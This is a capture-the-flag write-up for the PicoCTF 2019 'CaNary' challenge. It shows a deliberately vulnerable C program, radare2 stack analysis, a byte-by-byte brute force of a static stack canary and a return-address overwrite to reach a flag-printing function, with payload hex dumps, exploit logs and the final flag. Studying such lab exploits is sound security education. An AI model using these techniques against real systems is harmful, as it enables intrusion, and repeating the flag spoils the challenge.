# CaNary | PicoCTF2019

## Problem
This time we added a canary to detect buffer overflows. Can you still find a way to retreive the flag from this program located in /problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe.  
Hint: Maybe there's a smart way to brute-force the canary?  

## Solution
### 1. Examine the source code
```c
#define FLAG_LEN 64
#define KEY_LEN 4

void display_flag() {
  char buf[FLAG_LEN];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }
  fgets(buf,FLAG_LEN,f);
  puts(buf);
  fflush(stdout);
}

char key[KEY_LEN];
void read_canary() {
  FILE *f = fopen("/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/canary.txt","r");
  if (f == NULL) {
    printf("[ERROR]: Trying to Read Canary\n");
    exit(0);
  }
  fread(key,sizeof(char),KEY_LEN,f);
  fclose(f);
}

void vuln(){
   char canary[KEY_LEN];
   char buf[BUF_SIZE];
   char user_len[BUF_SIZE];

   int count;
   int x = 0;
   memcpy(canary,key,KEY_LEN);
   printf("Please enter the length of the entry:\n> ");

   while (x<BUF_SIZE) {
      read(0,user_len+x,1);
      if (user_len[x]=='\n') break;
      x++;
   }
   sscanf(user_len,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,key,KEY_LEN)) {
      printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  int i;
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  read_canary();
  vuln();

  return 0;
}
```
Looking at the source code, first thing that is noticed is a display_flag function that prints the flag, which is obviously the function that I want to invoke. Prior to calling the vuln() function that reads input from the user, a read_canary function reads a canary value from a file and stores it in memory as a global variable.  
In the vuln() function, a bunch of variables are defined, including a local canary byte, the user input buffer and input length. The following then takes place:
1. Copy the value from the global canary variable into the local one using memcpy().
2. For each character in the stdin file, read it in to the user_len array.
3. Store the user_len content as an integer in the count memory.
4. Get some input from the user up to the length of the count value and chuck it on the stack.
5. Check if the canary value has changed, and if it has, exit with an error.
6. If the canary is the same, print a message asking where the flag is.  
  
Getting two instances of input is pretty useful here, as well as having some nice verbose messages telling me when I have either changed the canary or kept it the same. The canary is also not actually a random value like it should be, it is a constant being read from a file. Knowing it is the same means we can effectively bruteforce it one byte at a time. They KEY_LEN is defined as 4, meaning I am brute forcing a 4 byte value which should not be difficult.

### 2. Set up the canary
A small thing I have to do in order to test my exploit offline is create a canary file for the binary to read in.
```bash
kali@kali:~/Desktop/pctf/canary$ sudo mkdir -p /problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe
kali@kali:~/Desktop/pctf/canary$ sudo touch /problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/canary.txt
kali@kali:~/Desktop/pctf/canary$ sudo vim /problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/canary.txt
kali@kali:~/Desktop/pctf/canary$ sudo cat /problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/canary.txt
JACK
kali@kali:~/Desktop/pctf/canary$ sudo chown kali:kali /problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/canary.txt
kali@kali:~/Desktop/pctf/canary$ sudo ls -l /problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe
total 4
-rw-r--r-- 1 kali kali 5 Jul 23 21:40 canary.txt
```
Now I can run the binary and verify it's reading the canary ok.
```bash
kali@kali:~/Desktop/pctf/canary$ ./vuln
Please enter the length of the entry:
> 20
Input> test
Ok... Now Where's the Flag?
```
Cool, that seems to work fine.

### 3. Do some dynamic analysis
Before I start bruting the canary I want to make sure I understand how the stack is being constructed so some quick dynamic analysis can confirm how I should be constructing the attack. To do that I will use radare2.
```bash
kali@kali:~/Desktop/pctf/canary$ r2 -d vuln
Process with PID 2772 started...
= attach 2772 2772
bin.baddr 0x565d5000
Using 0x565d5000
asm.bits 32
glibc.fc_offset = 0x00148
Warning: r_bin_file_hash: file exceeds bin.hashlimit
[0xf7ee20b0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[TOFIX: aaft can't run in debugger mode.ions (aaft)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0xf7ee20b0]> pdf @sym.vuln
            ; CALL XREF from main @ 0x565d5a5a
┌ 273: sym.vuln ();
│           ; var int32_t var_54h @ ebp-0x54
│           ; var int32_t var_50h @ ebp-0x50
│           ; var int32_t var_30h @ ebp-0x30
│           ; var int32_t var_10h @ ebp-0x10
│           ; var int32_t var_ch @ ebp-0xc
│           ; var int32_t var_4h @ ebp-0x4
│           0x565d58f4      55             push ebp
│           0x565d58f5      89e5           mov ebp, esp
│           0x565d58f7      53             push ebx
│           0x565d58f8      83ec54         sub esp, 0x54
│           0x565d58fb      e8f0fdffff     call sym.__x86.get_pc_thunk.bx
│           0x565d5900      81c3a0160000   add ebx, 0x16a0
│           0x565d5906      c745f4000000.  mov dword [var_ch], 0
│           0x565d590d      8d836c000000   lea eax, dword [ebx + 0x6c]
│           0x565d5913      8b00           mov eax, dword [eax]
│           0x565d5915      8945f0         mov dword [var_10h], eax
│           0x565d5918      83ec0c         sub esp, 0xc
│           0x565d591b      8d83ecebffff   lea eax, dword [ebx - 0x1414]
│           0x565d5921      50             push eax
│           0x565d5922      e899fcffff     call sym.imp.printf         ; int printf(const char *format)
│           0x565d5927      83c410         add esp, 0x10
│       ┌─< 0x565d592a      eb2b           jmp 0x565d5957
│      ┌──> 0x565d592c      8b45f4         mov eax, dword [var_ch]
│      ╎│   0x565d592f      8d55b0         lea edx, dword [var_50h]
│      ╎│   0x565d5932      01d0           add eax, edx
│      ╎│   0x565d5934      83ec04         sub esp, 4
│      ╎│   0x565d5937      6a01           push 1                      ; 1
│      ╎│   0x565d5939      50             push eax
│      ╎│   0x565d593a      6a00           push 0
│      ╎│   0x565d593c      e86ffcffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│      ╎│   0x565d5941      83c410         add esp, 0x10
│      ╎│   0x565d5944      8d55b0         lea edx, dword [var_50h]
│      ╎│   0x565d5947      8b45f4         mov eax, dword [var_ch]
│      ╎│   0x565d594a      01d0           add eax, edx
│      ╎│   0x565d594c      0fb600         movzx eax, byte [eax]
│      ╎│   0x565d594f      3c0a           cmp al, 0xa                 ; 10
│     ┌───< 0x565d5951      740c           je 0x565d595f
│     │╎│   0x565d5953      8345f401       add dword [var_ch], 1
│     │╎│   ; CODE XREF from sym.vuln @ 0x565d592a
│     │╎└─> 0x565d5957      837df41f       cmp dword [var_ch], 0x1f
│     │└──< 0x565d595b      7ecf           jle 0x565d592c
│     │ ┌─< 0x565d595d      eb01           jmp 0x565d5960
│     └───> 0x565d595f      90             nop
│       │   ; CODE XREF from sym.vuln @ 0x565d595d
│       └─> 0x565d5960      83ec04         sub esp, 4
│           0x565d5963      8d45ac         lea eax, dword [var_54h]
│           0x565d5966      50             push eax
│           0x565d5967      8d8315ecffff   lea eax, dword [ebx - 0x13eb]
│           0x565d596d      50             push eax
│           0x565d596e      8d45b0         lea eax, dword [var_50h]
│           0x565d5971      50             push eax
│           0x565d5972      e8e9fcffff     call sym.imp.__isoc99_sscanf ; int sscanf(const char *s, const char *format,   ...)
│           0x565d5977      83c410         add esp, 0x10
│           0x565d597a      83ec0c         sub esp, 0xc
│           0x565d597d      8d8318ecffff   lea eax, dword [ebx - 0x13e8]
│           0x565d5983      50             push eax
│           0x565d5984      e837fcffff     call sym.imp.printf         ; int printf(const char *format)
│           0x565d5989      83c410         add esp, 0x10
│           0x565d598c      8b45ac         mov eax, dword [var_54h]
│           0x565d598f      83ec04         sub esp, 4
│           0x565d5992      50             push eax
│           0x565d5993      8d45d0         lea eax, dword [var_30h]
│           0x565d5996      50             push eax
│           0x565d5997      6a00           push 0
│           0x565d5999      e812fcffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x565d599e      83c410         add esp, 0x10
│           0x565d59a1      83ec04         sub esp, 4
│           0x565d59a4      6a04           push 4                      ; 4
│           0x565d59a6      8d836c000000   lea eax, dword [ebx + 0x6c]
│           0x565d59ac      50             push eax
│           0x565d59ad      8d45f0         lea eax, dword [var_10h]
│           0x565d59b0      50             push eax
│           0x565d59b1      e84afcffff     call sym.imp.memcmp         ; int memcmp(const void *s1, const void *s2, size_t n)
│           0x565d59b6      83c410         add esp, 0x10
│           0x565d59b9      85c0           test eax, eax
│       ┌─< 0x565d59bb      741c           je 0x565d59d9
│       │   0x565d59bd      83ec0c         sub esp, 0xc
│       │   0x565d59c0      8d8320ecffff   lea eax, dword [ebx - 0x13e0]
│       │   0x565d59c6      50             push eax
│       │   0x565d59c7      e864fcffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x565d59cc      83c410         add esp, 0x10
│       │   0x565d59cf      83ec0c         sub esp, 0xc
│       │   0x565d59d2      6aff           push -1
│       │   0x565d59d4      e867fcffff     call sym.imp.exit           ; void exit(int status)
│       └─> 0x565d59d9      83ec0c         sub esp, 0xc
│           0x565d59dc      8d8358ecffff   lea eax, dword [ebx - 0x13a8]
│           0x565d59e2      50             push eax
│           0x565d59e3      e848fcffff     call sym.imp.puts           ; int puts(const char *s)
│           0x565d59e8      83c410         add esp, 0x10
│           0x565d59eb      8b8354000000   mov eax, dword [ebx + 0x54]
│           0x565d59f1      8b00           mov eax, dword [eax]
│           0x565d59f3      83ec0c         sub esp, 0xc
│           0x565d59f6      50             push eax
│           0x565d59f7      e8d4fbffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x565d59fc      83c410         add esp, 0x10
│           0x565d59ff      90             nop
│           0x565d5a00      8b5dfc         mov ebx, dword [var_4h]
│           0x565d5a03      c9             leave
└           0x565d5a04      c3             ret
```
I'm going to set a breakpoint at the memcmp() function and then examine the state of the program's stack from there.
```bash
[0xf7ee20b0]> db 0x565d59b1
[0xf7ee20b0]> dc
Please enter the length of the entry:
> 15
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
hit breakpoint at: 565d59b1
|ERROR| Invalid command 'AAAAAAAAAAAAAAA' (0x41)
[0x565d59b1]> pxr @esp
0xffececc0 0xffeced18  .... @esp ([stack]) stack R W 0x4b43414a -->  ascii ('J')
0xffececc4 0x565d700c  .p]V (/home/kali/Desktop/pctf/canary/vuln) (.bss) program R W 0x4b43414a (JACK) -->  ascii ('J')
0xffececc8 0x00000004  .... 4
0xffececcc 0x565d5900  .Y]V (/home/kali/Desktop/pctf/canary/vuln) (.text) sym.vuln program ascii (' R X 'add ebx, 0x16a0' 'vuln'
0xffececd0 0x565d6fa0  .o]V (/home/kali/Desktop/pctf/canary/vuln) (.got) program R W 0x1ea8 -->  7848
0xffececd4 0x0000000f  .... 15      <-------- INPUT LENGTH
0xffececd8 0x000a3531  15..
0xffececdc 0xf7ebe000  ....
0xffecece0 0x565d5b2c  ,[]V (/home/kali/Desktop/pctf/canary/vuln) (.rodata) str.problems_canary_6_c4c3b4565f3c8c0c855907b211b63efe_canary.txt program ascii (',') R X 'das' 'vuln' (/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/canary.txt)
0xffecece4 0x565d5af0  .Z]V (/home/kali/Desktop/pctf/canary/vuln) (.rodata) program R X 'jb 0x565d5af2' 'vuln'
0xffecece8 0x00000001  .... 1
0xffececec 0x565d6fa0  .o]V (/home/kali/Desktop/pctf/canary/vuln) (.got) program R W 0x1ea8 -->  7848
0xffececf0 0xf7ebe000  ....
0xffececf4 0xf7ebe000  ....
0xffececf8 0x41414141  AAAA @ecx ascii ('A')
0xffececfc 0x41414141  AAAA ascii ('A')
0xffeced00 0x41414141  AAAA ascii ('A')     <--------USER INPUT BUFFER
0xffeced04 0x00414141  AAA. ascii ('A')
0xffeced08 0x00000004  .... 4
0xffeced0c 0x5688d1a0  ...V
0xffeced10 0xf7ebe000  ....
0xffeced14 0xf7ebe000  ....
0xffeced18 0x4b43414a  JACK @eax ascii ('J')     <------- STACK CANARY
0xffeced1c 0x00000002  .... 2
0xffeced20 0x000003e8  .... 1000
0xffeced24 0x565d6fa0  .o]V (/home/kali/Desktop/pctf/canary/vuln) (.got) program R W 0x1ea8 -->  7848
0xffeced28 0xffeced48  H... @ebp ([stack]) stack R W 0x0 -->  0 section..shstrtab
0xffeced2c 0x565d5a5f  _Z]V (/home/kali/Desktop/pctf/canary/vuln) (.text) main program ascii ('_') R X 'mov eax, 0' 'vuln'
0xffeced30 0x00000001  .... 1
```
Ok, so the stack canary is definately there on top of the user's input buffer, the length of which is controlled by the input length variable. The BUF_SIZE is set to 32. The last piece of information I'll quickly grab is the memory address of the print_flag function for use once we get past the canary.
```bash
kali@kali:~/Desktop/pctf/canary$ objdump -D vuln | grep display
000007ed <display_flag>:
 81f:   75 1c                   jne    83d <display_flag+0x50>
```
The address is 0x000007ed.
At this point we have enough information to create a canary brute forcing script.

### 4. Create the canary bypass
Basically I create a script to repeatedly send different bytes at the canary until I find a byte in which the program allows the "Ok, where's the flag?" message to be printed, which means the canary didn't change, meaning we found a valid byte. Once I have recovered 4 bytes of the canary, I can continue to overwrite EIP to get the flag (see solve.py).
```bash
kali@kali:~/Desktop/pctf/canary$ python solve.py 
[*] '/home/kali/Desktop/pctf/canary/vuln'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Trying byte \x00now (input length: 33)
[+] Starting local process '/home/kali/Desktop/pctf/canary/vuln': pid 11935
[*] Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00[*] *** Stack Smashing Detected *** : Canary Value Corrupt!
[*] Process '/home/kali/Desktop/pctf/canary/vuln' stopped with exit code 255 (pid 11935)
[*] Trying byte  now (input length: 33)
[+] Starting local process '/home/kali/Desktop/pctf/canary/vuln': pid 11937
[*] Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[*] *** Stack Smashing Detected *** : Canary Value Corrupt!
[*] Process '/home/kali/Desktop/pctf/canary/vuln' stopped with exit code 255 (pid 11937)
[*] Trying byte  now (input length: 33)
[+] Starting local process '/home/kali/Desktop/pctf/canary/vuln': pid 11939
[*] Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[*] *** Stack Smashing Detected *** : Canary Value Corrupt!
[*] Process '/home/kali/Desktop/pctf/canary/vuln' stopped with exit code 255 (pid 11939)
...
[+] Starting local process '/home/kali/Desktop/pctf/canary/vuln': pid 11918
[*] Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJACJ
[*] *** Stack Smashing Detected *** : Canary Value Corrupt!
[*] Process '/home/kali/Desktop/pctf/canary/vuln' stopped with exit code 255 (pid 11918)
[*] Trying byte K now (input length: 36)
[+] Starting local process '/home/kali/Desktop/pctf/canary/vuln': pid 11920
[*] Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJACK
[*] Ok... Now Where's the Flag?
[*] Process '/home/kali/Desktop/pctf/canary/vuln' stopped with exit code 0 (pid 11920)
[*] Found canary byte: K
[*] Canary value: JACK
```

### 5. Get to the print_flag function
Now I have bruteforced the canary I'm just going to attach to gdb and write through EIP to cause a segfault, grab the EIP offset and then write in the print_flag function location. Once that's done, the exploit is complete. So firstly find where EIP is when the function completes:
```bash
kali@kali:~/Desktop/pctf/canary$ sudo dmesg -C
kali@kali:~/Desktop/pctf/canary$ python -c "from pwn import cyclic; print(b'A' * 32 + b'JACK' + cyclic(20))"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJACKaaaabaaacaaadaaaeaaa
kali@kali:~/Desktop/pctf/canary$ ./vuln
Please enter the length of the entry:
> 56
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJACKaaaabaaacaaadaaaeaaa
Ok... Now Where's the Flag?
Segmentation fault
kali@kali:~/Desktop/pctf/canary$ sudo dmesg -t
vuln[13996]: segfault at 61616165 ip 0000000061616165 sp 00000000ffac0110 error 14 in libc-2.30.so[f7d3c000+1d000]
Code: Bad RIP value.
```
Then modify my exploit and test it.
```bash
[+] Starting local process '/home/kali/Desktop/pctf/canary/vuln': pid 15367
[DEBUG] Received 0x28 bytes:
    'Please enter the length of the entry:\n'
    '> '
[DEBUG] Sent 0x3 bytes:
    '56\n'
[DEBUG] Received 0x7 bytes:
    'Input> '
[DEBUG] Sent 0x39 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  4a 41 43 4b  41 41 41 41  41 41 41 41  41 41 41 41  │JACK│AAAA│AAAA│AAAA│
    00000030  41 41 41 41  ed 07 00 00  0a                        │AAAA│····│·│
    00000039
[DEBUG] Received 0x1c bytes:
    "Ok... Now Where's the Flag?\n"
Ok... Now Where's the Flag?

[*] Stopped process '/home/kali/Desktop/pctf/canary/vuln' (pid 15367)
```
Aaand it didn't work. The program is actually segfaulting, even though it is being given what I think is the right address in the right location. This is actually due to Position Independant Code (PIE) being enabled which means the function is not always at the right position in the address space. However this can be beaten by just repeatedly running the payload again and again until the function gets hit.

```bash
kali@kali:~/Desktop/pctf/canary$ python solve.py 
[*] '/home/kali/Desktop/pctf/canary/vuln'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
Payload: 00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
*
00000020  4a 41 43 4b  42 42 42 42  42 42 42 42  42 42 42 42  │JACK│BBBB│BBBB│BBBB│
00000030  42 42 42 42  ed 07                                  │BBBB│··│
00000036
Size: 54
[*] Canary value: JACK
[+] Starting local process '/home/kali/Desktop/pctf/canary/vuln': pid 35024
[+] Receiving all data: Done (28B)
[*] Process '/home/kali/Desktop/pctf/canary/vuln' stopped with exit code -11 (SIGSEGV) (pid 35024)
Ok... Now Where's the Flag?

[+] Starting local process '/home/kali/Desktop/pctf/canary/vuln': pid 35027
[+] Receiving all data: Done (28B)
[*] Process '/home/kali/Desktop/pctf/canary/vuln' stopped with exit code -11 (SIGSEGV) (pid 35027)
Ok... Now Where's the Flag?

[+] Starting local process '/home/kali/Desktop/pctf/canary/vuln': pid 35036
[+] Receiving all data: Done (28B)
[*] Process '/home/kali/Desktop/pctf/canary/vuln' stopped with exit code -11 (SIGSEGV) (pid 35036)
Ok... Now Where's the Flag?

[+] Starting local process '/home/kali/Desktop/pctf/canary/vuln': pid 35039
[+] Receiving all data: Done (28B)
[*] Process '/home/kali/Desktop/pctf/canary/vuln' stopped with exit code -11 (SIGSEGV) (pid 35039)
Ok... Now Where's the Flag?

[+] Starting local process '/home/kali/Desktop/pctf/canary/vuln': pid 35042
[+] Receiving all data: Done (28B)
[*] Stopped process '/home/kali/Desktop/pctf/canary/vuln' (pid 35042)
Ok... Now Where's the Flag?

[+] Starting local process '/home/kali/Desktop/pctf/canary/vuln': pid 35045
[+] Receiving all data: Done (73B)
[*] Process '/home/kali/Desktop/pctf/canary/vuln' stopped with exit code 0 (pid 35045)
Ok... Now Where's the Flag?
'flag.txt' missing in the current directory!

Ok... Now Where's the Flag?
'flag.txt' missing in the current directory!
```

### 6. Run it on the server to win
I gotta modify my script to connect and run the binary over SSH, and then it gives the flag.
```bash
kali@kali:~/Desktop/pctf/canary$ python solve.py REMOTE
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] jib1337@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[*] '/home/kali/Desktop/pctf/canary/vuln'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Retrieving canary value...
[*] Trying byte \x00now (input length: 33)
[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3805172
[*] Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00[*] *** Stack Smashing Detected *** : Canary Value Corrupt!
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3805172)
[*] Trying byte  now (input length: 33)
[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3805176
[*] Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[*] *** Stack Smashing Detected *** : Canary Value Corrupt!
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3805176)
[*] Trying byte  now (input length: 33)
[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3805180
[*] Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[*] *** Stack Smashing Detected *** : Canary Value Corrupt!
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3805180)
[*] Trying byte \x03now (input length: 33)
[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3805184
...
[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3805594
[*] Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAL
[*] Ok... Now Where's the Flag?
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3805594)
[*] Found canary byte: L
...
[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3809804
[*] Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALj
[*] Ok... Now Where's the Flag?
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3809804)
[*] Found canary byte: j
...
[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810402
[*] Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALjg
[*] Ok... Now Where's the Flag?
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810402)
[*] Found canary byte: g
...
[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810833
[*] Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALjgH
[*] Ok... Now Where's the Flag?
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810833)
[*] Found canary byte: H
Payload: 00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
*
00000020  4c 6a 67 48  42 42 42 42  42 42 42 42  42 42 42 42  │LjgH│BBBB│BBBB│BBBB│
00000030  42 42 42 42  ed 07                                  │BBBB│··│
00000036
Size: 54
[*] Canary value: LjgH
[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810837
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810837)
Ok... Now Where's the Flag?

[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810842
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810842)
Ok... Now Where's the Flag?

[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810848
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810848)
Ok... Now Where's the Flag?

[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810853
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810853)
Ok... Now Where's the Flag?

[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810858
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810858)
Ok... Now Where's the Flag?

[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810863
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810863)
Ok... Now Where's the Flag?

[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810868
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810868)
Ok... Now Where's the Flag?

[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810873
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810873)
Ok... Now Where's the Flag?

[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810878
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810878)
Ok... Now Where's the Flag?

[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810883
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810883)
Ok... Now Where's the Flag?

[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810888
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810888)
Ok... Now Where's the Flag?

[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810893
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810893)
Ok... Now Where's the Flag?

[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810898
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810898)
Ok... Now Where's the Flag?

[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810903
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810903)
Ok... Now Where's the Flag?

[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810908
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810908)
Ok... Now Where's the Flag?

[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810913
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810913)
Ok... Now Where's the Flag?

[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810918
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810918)
Ok... Now Where's the Flag?

[+] Starting remote process 'vuln' on 2019shell1.picoctf.com: pid 3810923
[+] Receiving all data: Done (71B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 3810923)
Ok... Now Where's the Flag?
picoCTF{cAnAr135_mU5t_b3_r4nd0m!_bf34cd22}
```
